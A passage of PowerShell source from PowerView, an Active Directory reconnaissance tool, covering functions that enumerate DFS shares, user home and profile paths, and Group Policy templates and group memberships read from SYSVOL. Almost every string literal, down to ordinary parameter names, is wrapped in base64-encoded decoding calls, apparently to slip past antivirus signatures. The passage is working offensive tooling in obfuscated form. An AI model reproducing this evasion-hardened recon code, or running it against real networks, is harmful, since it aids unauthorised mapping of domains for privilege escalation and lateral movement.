            $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQA=')))]) {Split-Path($UserResult.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQA=')))])}if ($UserResult.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAHIAaQBwAHQAcABhAHQAaAA=')))]) {Split-Path($UserResult.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAHIAaQBwAHQAcABhAHQAaAA=')))])}if ($UserResult.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAG8AZgBpAGwAZQBwAGEAdABoAA==')))]) {Split-Path($UserResult.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAG8AZgBpAGwAZQBwAGEAdABoAA==')))])}}) | Sort-Object -Unique
        }
    }
}
function Get-DomainDFSShare {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        $Version = 'All'
    )
    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        function Parse-Pkt {
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Pkt
            )
            $bin = $Pkt
            $blob_version = [bitconverter]::ToUInt32($bin[0..3],0)
            $blob_element_count = [bitconverter]::ToUInt32($bin[4..7],0)
            $offset = 8
            $object_list = @()
            for($i=1; $i -le $blob_element_count; $i++){
                $blob_name_size_start = $offset
                $blob_name_size_end = $offset + 1
                $blob_name_size = [bitconverter]::ToUInt16($bin[$blob_name_size_start..$blob_name_size_end],0)
                $blob_name_start = $blob_name_size_end + 1
                $blob_name_end = $blob_name_start + $blob_name_size - 1
                $blob_name = [System.Text.Encoding]::Unicode.GetString($bin[$blob_name_start..$blob_name_end])
                $blob_data_size_start = $blob_name_end + 1
                $blob_data_size_end = $blob_data_size_start + 3
                $blob_data_size = [bitconverter]::ToUInt32($bin[$blob_data_size_start..$blob_data_size_end],0)
                $blob_data_start = $blob_data_size_end + 1
                $blob_data_end = $blob_data_start + $blob_data_size - 1
                $blob_data = $bin[$blob_data_start..$blob_data_end]
                switch -wildcard ($blob_name) {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABzAGkAdABlAHIAbwBvAHQA'))) {  }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABkAG8AbQBhAGkAbgByAG8AbwB0ACoA'))) {
                        $root_or_link_guid_start = 0
                        $root_or_link_guid_end = 15
                        $root_or_link_guid = [byte[]]$blob_data[$root_or_link_guid_start..$root_or_link_guid_end]
                        $guid = New-Object Guid(,$root_or_link_guid) 
                        $prefix_size_start = $root_or_link_guid_end + 1
                        $prefix_size_end = $prefix_size_start + 1
                        $prefix_size = [bitconverter]::ToUInt16($blob_data[$prefix_size_start..$prefix_size_end],0)
                        $prefix_start = $prefix_size_end + 1
                        $prefix_end = $prefix_start + $prefix_size - 1
                        $prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$prefix_start..$prefix_end])
                        $short_prefix_size_start = $prefix_end + 1
                        $short_prefix_size_end = $short_prefix_size_start + 1
                        $short_prefix_size = [bitconverter]::ToUInt16($blob_data[$short_prefix_size_start..$short_prefix_size_end],0)
                        $short_prefix_start = $short_prefix_size_end + 1
                        $short_prefix_end = $short_prefix_start + $short_prefix_size - 1
                        $short_prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$short_prefix_start..$short_prefix_end])
                        $type_start = $short_prefix_end + 1
                        $type_end = $type_start + 3
                        $type = [bitconverter]::ToUInt32($blob_data[$type_start..$type_end],0)
                        $state_start = $type_end + 1
                        $state_end = $state_start + 3
                        $state = [bitconverter]::ToUInt32($blob_data[$state_start..$state_end],0)
                        $comment_size_start = $state_end + 1
                        $comment_size_end = $comment_size_start + 1
                        $comment_size = [bitconverter]::ToUInt16($blob_data[$comment_size_start..$comment_size_end],0)
                        $comment_start = $comment_size_end + 1
                        $comment_end = $comment_start + $comment_size - 1
                        if ($comment_size -gt 0)  {
                            $comment = [System.Text.Encoding]::Unicode.GetString($blob_data[$comment_start..$comment_end])
                        }
                        $prefix_timestamp_start = $comment_end + 1
                        $prefix_timestamp_end = $prefix_timestamp_start + 7
                        $prefix_timestamp = $blob_data[$prefix_timestamp_start..$prefix_timestamp_end] 
                        $state_timestamp_start = $prefix_timestamp_end + 1
                        $state_timestamp_end = $state_timestamp_start + 7
                        $state_timestamp = $blob_data[$state_timestamp_start..$state_timestamp_end]
                        $comment_timestamp_start = $state_timestamp_end + 1
                        $comment_timestamp_end = $comment_timestamp_start + 7
                        $comment_timestamp = $blob_data[$comment_timestamp_start..$comment_timestamp_end]
                        $version_start = $comment_timestamp_end  + 1
                        $version_end = $version_start + 3
                        $version = [bitconverter]::ToUInt32($blob_data[$version_start..$version_end],0)
                        $dfs_targetlist_blob_size_start = $version_end + 1
                        $dfs_targetlist_blob_size_end = $dfs_targetlist_blob_size_start + 3
                        $dfs_targetlist_blob_size = [bitconverter]::ToUInt32($blob_data[$dfs_targetlist_blob_size_start..$dfs_targetlist_blob_size_end],0)
                        $dfs_targetlist_blob_start = $dfs_targetlist_blob_size_end + 1
                        $dfs_targetlist_blob_end = $dfs_targetlist_blob_start + $dfs_targetlist_blob_size - 1
                        $dfs_targetlist_blob = $blob_data[$dfs_targetlist_blob_start..$dfs_targetlist_blob_end]
                        $reserved_blob_size_start = $dfs_targetlist_blob_end + 1
                        $reserved_blob_size_end = $reserved_blob_size_start + 3
                        $reserved_blob_size = [bitconverter]::ToUInt32($blob_data[$reserved_blob_size_start..$reserved_blob_size_end],0)
                        $reserved_blob_start = $reserved_blob_size_end + 1
                        $reserved_blob_end = $reserved_blob_start + $reserved_blob_size - 1
                        $reserved_blob = $blob_data[$reserved_blob_start..$reserved_blob_end]
                        $referral_ttl_start = $reserved_blob_end + 1
                        $referral_ttl_end = $referral_ttl_start + 3
                        $referral_ttl = [bitconverter]::ToUInt32($blob_data[$referral_ttl_start..$referral_ttl_end],0)
                        $target_count_start = 0
                        $target_count_end = $target_count_start + 3
                        $target_count = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_count_start..$target_count_end],0)
                        $t_offset = $target_count_end + 1
                        for($j=1; $j -le $target_count; $j++){
                            $target_entry_size_start = $t_offset
                            $target_entry_size_end = $target_entry_size_start + 3
                            $target_entry_size = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_entry_size_start..$target_entry_size_end],0)
                            $target_time_stamp_start = $target_entry_size_end + 1
                            $target_time_stamp_end = $target_time_stamp_start + 7
                            $target_time_stamp = $dfs_targetlist_blob[$target_time_stamp_start..$target_time_stamp_end]
                            $target_state_start = $target_time_stamp_end + 1
                            $target_state_end = $target_state_start + 3
                            $target_state = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_state_start..$target_state_end],0)
                            $target_type_start = $target_state_end + 1
                            $target_type_end = $target_type_start + 3
                            $target_type = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_type_start..$target_type_end],0)
                            $server_name_size_start = $target_type_end + 1
                            $server_name_size_end = $server_name_size_start + 1
                            $server_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$server_name_size_start..$server_name_size_end],0)
                            $server_name_start = $server_name_size_end + 1
                            $server_name_end = $server_name_start + $server_name_size - 1
                            $server_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$server_name_start..$server_name_end])
                            $share_name_size_start = $server_name_end + 1
                            $share_name_size_end = $share_name_size_start + 1
                            $share_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$share_name_size_start..$share_name_size_end],0)
                            $share_name_start = $share_name_size_end + 1
                            $share_name_end = $share_name_start + $share_name_size - 1
                            $share_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$share_name_start..$share_name_end])
                            $target_list += "\\$server_name\$share_name"
                            $t_offset = $share_name_end + 1
                        }
                    }
                }
                $offset = $blob_data_end + 1
                $dfs_pkt_properties = @{
                    'Name' = $blob_name
                    'Prefix' = $prefix
                    'TargetList' = $target_list
                }
                $object_list += New-Object -TypeName PSObject -Property $dfs_pkt_properties
                $prefix = $Null
                $blob_name = $Null
                $target_list = $Null
            }
            $servers = @()
            $object_list | ForEach-Object {
                if ($_.TargetList) {
                    $_.TargetList | ForEach-Object {
                        $servers += $_.split('\')[2]
                    }
                }
            }
            $servers
        }
        function Get-DomainDFSShareV1 {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,
                [String]
                $SearchBase,
                [String]
                $Server,
                [String]
                $SearchScope = 'Subtree',
                [Int]
                $ResultPageSize = 200,
                [Int]
                $ServerTimeLimit,
                [Switch]
                $Tombstone,
                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )
            $DFSsearcher = Get-DomainSearcher @PSBoundParameters
            if ($DFSsearcher) {
                $DFSshares = @()
                $DFSsearcher.filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBsAGEAcwBzAD0AZgBUAEQAZgBzACkAKQA=')))
                try {
                    $Results = $DFSSearcher.FindAll()
                    $Results | Where-Object {$_} | ForEach-Object {
                        $Properties = $_.Properties
                        $RemoteNames = $Properties.remoteservername
                        $Pkt = $Properties.pkt
                        $DFSshares += $RemoteNames | ForEach-Object {
                            try {
                                if ( $_.Contains('\') ) {
                                    New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV1 error in parsing DFS share : $_"
                            }
                        }
                    }
                    if ($Results) {
                        try { $Results.dispose() }
                        catch {
                            Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV1 error disposing of the Results object: $_"
                        }
                    }
                    $DFSSearcher.dispose()
                    if ($pkt -and $pkt[0]) {
                        Parse-Pkt $pkt[0] | ForEach-Object {
                            if ($_ -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgB1AGwAbAA=')))) {
                                New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_}
                            }
                        }
                    }
                }
                catch {
                    Write-Warning "[Get-DomainDFSShare] Get-DomainDFSShareV1 error : $_"
                }
                $DFSshares | Sort-Object -Unique -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUwBlAHIAdgBlAHIATgBhAG0AZQA=')))
            }
        }
        function Get-DomainDFSShareV2 {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,
                [String]
                $SearchBase,
                [String]
                $Server,
                [String]
                $SearchScope = 'Subtree',
                [Int]
                $ResultPageSize = 200,
                [Int]
                $ServerTimeLimit,
                [Switch]
                $Tombstone,
                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )
            $DFSsearcher = Get-DomainSearcher @PSBoundParameters
            if ($DFSsearcher) {
                $DFSshares = @()
                $DFSsearcher.filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBsAGEAcwBzAD0AbQBzAEQARgBTAC0ATABpAG4AawB2ADIAKQApAA==')))
                $Null = $DFSSearcher.PropertiesToLoad.AddRange(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAZgBzAC0AbABpAG4AawBwAGEAdABoAHYAMgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAEQARgBTAC0AVABhAHIAZwBlAHQATABpAHMAdAB2ADIA')))))
                try {
                    $Results = $DFSSearcher.FindAll()
                    $Results | Where-Object {$_} | ForEach-Object {
                        $Properties = $_.Properties
                        $target_list = $Properties.'msdfs-targetlistv2'[0]
                        $xml = [xml][System.Text.Encoding]::Unicode.GetString($target_list[2..($target_list.Length-1)])
                        $DFSshares += $xml.targets.ChildNodes | ForEach-Object {
                            try {
                                $Target = $_.InnerText
                                if ( $Target.Contains('\') ) {
                                    $DFSroot = $Target.split('\')[3]
                                    $ShareName = $Properties.'msdfs-linkpathv2'[0]
                                    New-Object -TypeName PSObject -Property @{'Name'="$DFSroot$ShareName";'RemoteServerName'=$Target.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV2 error in parsing target : $_"
                            }
                        }
                    }
                    if ($Results) {
                        try { $Results.dispose() }
                        catch {
                            Write-Verbose "[Get-DomainDFSShare] Error disposing of the Results object: $_"
                        }
                    }
                    $DFSSearcher.dispose()
                }
                catch {
                    Write-Warning "[Get-DomainDFSShare] Get-DomainDFSShareV2 error : $_"
                }
                $DFSshares | Sort-Object -Unique -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUwBlAHIAdgBlAHIATgBhAG0AZQA=')))
            }
        }
    }
    PROCESS {
        $DFSshares = @()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ForEach ($TargetDomain in $Domain) {
                $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $TargetDomain
                if ($Version -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwAfAAxAA==')))) {
                    $DFSshares += Get-DomainDFSShareV1 @SearcherArguments
                }
                if ($Version -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwAfAAyAA==')))) {
                    $DFSshares += Get-DomainDFSShareV2 @SearcherArguments
                }
            }
        }
        else {
            if ($Version -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwAfAAxAA==')))) {
                $DFSshares += Get-DomainDFSShareV1 @SearcherArguments
            }
            if ($Version -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwAfAAyAA==')))) {
                $DFSshares += Get-DomainDFSShareV2 @SearcherArguments
            }
        }
        $DFSshares | Sort-Object -Property ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUwBlAHIAdgBlAHIATgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))) -Unique
    }
}
function Get-GptTmpl {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('gpcfilesyspath', 'Path')]
        [String]
        $GptTmplPath,
        [Switch]
        $OutputObject,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $MappedPaths = @{}
    }
    PROCESS {
        try {
            if (($GptTmplPath -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                $SysVolPath = "\\$((New-Object System.Uri($GptTmplPath)).Host)\SYSVOL"
                if (-not $MappedPaths[$SysVolPath]) {
                    Add-RemoteConnection -Path $SysVolPath -Credential $Credential
                    $MappedPaths[$SysVolPath] = $True
                }
            }
            $TargetGptTmplPath = $GptTmplPath
            if (-not $TargetGptTmplPath.EndsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBpAG4AZgA='))))) {
                $TargetGptTmplPath += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABNAEEAQwBIAEkATgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAUwBlAGMARQBkAGkAdABcAEcAcAB0AFQAbQBwAGwALgBpAG4AZgA=')))
            }
            Write-Verbose "[Get-GptTmpl] Parsing GptTmplPath: $TargetGptTmplPath"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                $Contents = Get-IniContent -Path $TargetGptTmplPath -OutputObject -ErrorAction Stop
                if ($Contents) {
                    $Contents | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))) $TargetGptTmplPath
                    $Contents
                }
            }
            else {
                $Contents = Get-IniContent -Path $TargetGptTmplPath -ErrorAction Stop
                if ($Contents) {
                    $Contents[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA=')))] = $TargetGptTmplPath
                    $Contents
                }
            }
        }
        catch {
            Write-Verbose "[Get-GptTmpl] Error parsing $TargetGptTmplPath : $_"
        }
    }
    END {
        $MappedPaths.Keys | ForEach-Object { Remove-RemoteConnection -Path $_ }
    }
}
function Get-GroupsXML {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GroupsXML')]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Path')]
        [String]
        $GroupsXMLPath,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $MappedPaths = @{}
    }
    PROCESS {
        try {
            if (($GroupsXMLPath -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                $SysVolPath = "\\$((New-Object System.Uri($GroupsXMLPath)).Host)\SYSVOL"
                if (-not $MappedPaths[$SysVolPath]) {
                    Add-RemoteConnection -Path $SysVolPath -Credential $Credential
                    $MappedPaths[$SysVolPath] = $True
                }
            }
            [XML]$GroupsXMLcontent = Get-Content -Path $GroupsXMLPath -ErrorAction Stop
            $GroupsXMLcontent | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBHAHIAbwB1AHAAcwAvAEcAcgBvAHUAcAA='))) | Select-Object -ExpandProperty node | ForEach-Object {
                $Groupname = $_.Properties.groupName
                $GroupSID = $_.Properties.groupSid
                if (-not $GroupSID) {
                    if ($Groupname -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzAA==')))) {
                        $GroupSID = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))
                    }
                    elseif ($Groupname -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAIABEAGUAcwBrAHQAbwBwAA==')))) {
                        $GroupSID = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))
                    }
                    elseif ($Groupname -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwB1AGUAcwB0AHMA')))) {
                        $GroupSID = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADYA')))
                    }
                    else {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                            $GroupSID = ConvertTo-SID -ObjectName $Groupname -Credential $Credential
                        }
                        else {
                            $GroupSID = ConvertTo-SID -ObjectName $Groupname
                        }
                    }
                }
                $Members = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAEQA'))) } | ForEach-Object {
                    if ($_.sid) { $_.sid }
                    else { $_.name }
                }
                if ($Members) {
                    if ($_.filters) {
                        $Filters = $_.filters.GetEnumerator() | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }
                    else {
                        $Filters = $Null
                    }
                    if ($Members -isnot [System.Array]) { $Members = @($Members) }
                    $GroupsXML = New-Object PSObject
                    $GroupsXML | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) $TargetGroupsXMLPath
                    $GroupsXML | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAdABlAHIAcwA='))) $Filters
                    $GroupsXML | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) $GroupName
                    $GroupsXML | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFMASQBEAA=='))) $GroupSID
                    $GroupsXML | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE0AZQBtAGIAZQByAE8AZgA='))) $Null
                    $GroupsXML | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE0AZQBtAGIAZQByAHMA'))) $Members
                    $GroupsXML.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAAcwBYAE0ATAA='))))
                    $GroupsXML
                }
            }
        }
        catch {
            Write-Verbose "[Get-GroupsXML] Error parsing $TargetGroupsXMLPath : $_"
        }
    }
    END {
        $MappedPaths.Keys | ForEach-Object { Remove-RemoteConnection -Path $_ }
    }
}
function Get-DomainGPO {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,
        [Parameter(ParameterSetName = 'ComputerIdentity')]
        [Alias('ComputerName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerIdentity,
        [Parameter(ParameterSetName = 'UserIdentity')]
        [Alias('UserName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
